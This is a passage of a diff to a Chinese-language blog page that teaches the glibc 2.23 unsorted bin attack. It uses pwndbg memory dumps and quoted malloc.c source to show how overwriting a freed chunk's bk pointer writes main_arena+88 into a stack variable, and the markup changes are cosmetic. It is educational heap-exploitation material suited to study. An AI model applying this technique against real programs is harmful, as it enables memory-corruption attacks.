<span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1ba8</span>	<span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bb8</span>	<span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bc8</span>	<span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bd8</span>	<span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1be8</span>	<span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>在之前的文章中我们说过，当unsortedbin只有一个free_chunk时，它的fd和bk指针都指向unsortedbin本身。</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png'><img src="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png" alt="Snipaste_2023-09-13_20-40-59.png"></p>
+<p class='item-img' data-src='https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png'><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png"
+                      alt="Snipaste_2023-09-13_20-40-59.png"
+                ><figcaption>Snipaste_2023-09-13_20-40-59.png</figcaption></figure></p>
 <h3 id="执行p-1-x3D-unsigned-long-amp-stack-var-2"><a href="#执行p-1-x3D-unsigned-long-amp-stack-var-2" class="headerlink" title="执行p[1]=(unsigned long)(&amp;stack_var-2);"></a>执行p[1]=(unsigned long)(&amp;stack_var-2);</h3><p>对代码第21行下断点，继续：p[1]=(unsigned long)(&amp;stack_var-2);</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007fffffffdd68</span><br>    		<span class="hljs-meta">#fd					#bk被更改</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007fffffffdd68</span><br>    		<span class="hljs-meta">#fd					#bk被更改</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>现在我们已经更改了unsortedbin中malloc_chunk1指针为0x00007fffffffdd68。刚好是刚才申请的 stack_var - 0x10 的位置</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>pwndbg&gt; unsortedbin <br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x00007fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:	<span class="hljs-number">0x00000000004007a8</span>	<span class="hljs-number">0x0000000000400870</span><br>    			<span class="hljs-meta">#unsortedbin中bk指针所指向的地方</span><br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602010</span><br>    			#想要被修改为超大值的地方<br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span>	<span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:	<span class="hljs-number">0x00007fffffffde78</span>	<span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:	<span class="hljs-number">0x00000000004006a6</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:	<span class="hljs-number">0x9c796560ff5ea285</span>	<span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>pwndbg&gt; unsortedbin <br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x00007fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:	<span class="hljs-number">0x00000000004007a8</span>	<span class="hljs-number">0x0000000000400870</span><br>    			<span class="hljs-meta">#unsortedbin中bk指针所指向的地方</span><br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602010</span><br>    			#想要被修改为超大值的地方<br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span>	<span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:	<span class="hljs-number">0x00007fffffffde78</span>	<span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:	<span class="hljs-number">0x00000000004006a6</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:	<span class="hljs-number">0x9c796560ff5ea285</span>	<span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure></div>
 
 <h3 id="执行malloc-0x410"><a href="#执行malloc-0x410" class="headerlink" title="执行malloc(0x410)"></a>执行malloc(0x410)</h3><p>执行malloc(0x410)时，会判断所申请的chunk处于smallbin所在的范围，但是此时smallbin中并没有空闲的chunk，所以会去unsortedbin找，发现unsortedbin不空，于是把unsortedbin中的<strong>最后一个</strong>chunk拿出来。<br>由于上面我们修改了bk指针所指向的地址，所以现在bk指针所指向的地址被加入到了unsortedbin中，也就是说，现在这个地址是unsortedbin中最后一个chunk，malloc之后将在这个地址中创建堆块。</p>
 <blockquote>
 <p>unsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即<strong>插入的时候插入到unsortedbin的头部，取出的时候从链尾获取。</strong></p>
 </blockquote>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>之后结果如下：<br>pwndbg&gt; unsortedbin<br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x7fffffffdd68</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   rbp<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602000</span> <span class="hljs-meta">#malloc(0x410)</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007fffffffdd68</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b88</span>	<span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b98</span>	<span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1ba8</span>	<span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bb8</span>	<span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bc8</span>	<span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bd8</span>	<span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1be8</span>	<span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x7fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:	<span class="hljs-number">0x000000000040080a</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x0000000000602010</span><br>    			#现在此地址被更改为较大的数（其值为main_arena+<span class="hljs-number">88</span>的地址）<br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span>	<span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:	<span class="hljs-number">0x00007fffffffde78</span>	<span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:	<span class="hljs-number">0x00000000004006a6</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:	<span class="hljs-number">0x9c796560ff5ea285</span>	<span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>之后结果如下：<br>pwndbg&gt; unsortedbin<br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x7fffffffdd68</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   rbp<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602000</span> <span class="hljs-meta">#malloc(0x410)</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007fffffffdd68</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b88</span>	<span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b98</span>	<span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1ba8</span>	<span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bb8</span>	<span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bc8</span>	<span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bd8</span>	<span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1be8</span>	<span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x7fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:	<span class="hljs-number">0x000000000040080a</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x0000000000602010</span><br>    			#现在此地址被更改为较大的数（其值为main_arena+<span class="hljs-number">88</span>的地址）<br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span>	<span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:	<span class="hljs-number">0x00007fffffffde78</span>	<span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:	<span class="hljs-number">0x00000000004006a6</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:	<span class="hljs-number">0x9c796560ff5ea285</span>	<span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>申请过程如下图所示：</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png'><img src="https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png" alt="Snipaste_2023-09-13_20-51-30.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png'><img src="https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png" alt="Snipaste_2023-09-13_20-52-24.png"></p>
+<p class='item-img' data-src='https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png'><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png"
+                      alt="Snipaste_2023-09-13_20-51-30.png"
+                ><figcaption>Snipaste_2023-09-13_20-51-30.png</figcaption></figure></p>
+<p class='item-img' data-src='https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png'><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png"
+                      alt="Snipaste_2023-09-13_20-52-24.png"
+                ><figcaption>Snipaste_2023-09-13_20-52-24.png</figcaption></figure></p>
 <p>核心代码如下：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#glibc-2.23/malloc/malloc.c</span><br>#源码第<span class="hljs-number">3515</span><span class="hljs-number">-3517</span>行<br>--------------------------------------------------------------------<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck; <span class="hljs-comment">//unsortedbin的bk改为chunk的bk</span><br>bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//将chunk的bk所指向的fd改为unsortedbin的地址</span><br><span class="hljs-comment">//unsorted_chunks(av)其实是&amp;main_arena.top</span><br>--------------------------------------------------------------------<br>解释：<br>unsorted_chunks (av)-&gt;bk(unsortedbin的bk)= bck(chunk的bk); <br>bck-&gt;fd (chunk的fd)= unsorted_chunks (av);<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#glibc-2.23/malloc/malloc.c</span><br>#源码第<span class="hljs-number">3515</span><span class="hljs-number">-3517</span>行<br>--------------------------------------------------------------------<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck; <span class="hljs-comment">//unsortedbin的bk改为chunk的bk</span><br>bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//将chunk的bk所指向的fd改为unsortedbin的地址</span><br><span class="hljs-comment">//unsorted_chunks(av)其实是&amp;main_arena.top</span><br>--------------------------------------------------------------------<br>解释：<br>unsorted_chunks (av)-&gt;bk(unsortedbin的bk)= bck(chunk的bk); <br>bck-&gt;fd (chunk的fd)= unsorted_chunks (av);<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>运行结果如下:</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">140737351850872</span>				<span class="hljs-comment">//一个很大的数字 0x7ffff7dd1b78 实际上是 main_arena+88</span><br>p = <span class="hljs-number">0x602010</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">140737351850872</span>				<span class="hljs-comment">//一个很大的数字 0x7ffff7dd1b78 实际上是 main_arena+88</span><br>p = <span class="hljs-number">0x602010</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>再来看一下unsortedbin的源码</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>     &#123;<br>       bck = victim-&gt;bk;<br>       <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                          chunk2mem (victim), av);<br>       size = chunksize (victim);<br><br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">          only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">          runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">          exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">          no exact fit for a small chunk.</span><br><span class="hljs-comment">        */</span><br> #显然，bck被修改，并不符合这里的要求<br>       <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>           bck == unsorted_chunks (av) &amp;&amp;<br>           victim == av-&gt;last_remainder &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         &#123;<br>           <span class="hljs-comment">/* split and reattach remainder */</span><br>           remainder_size = size 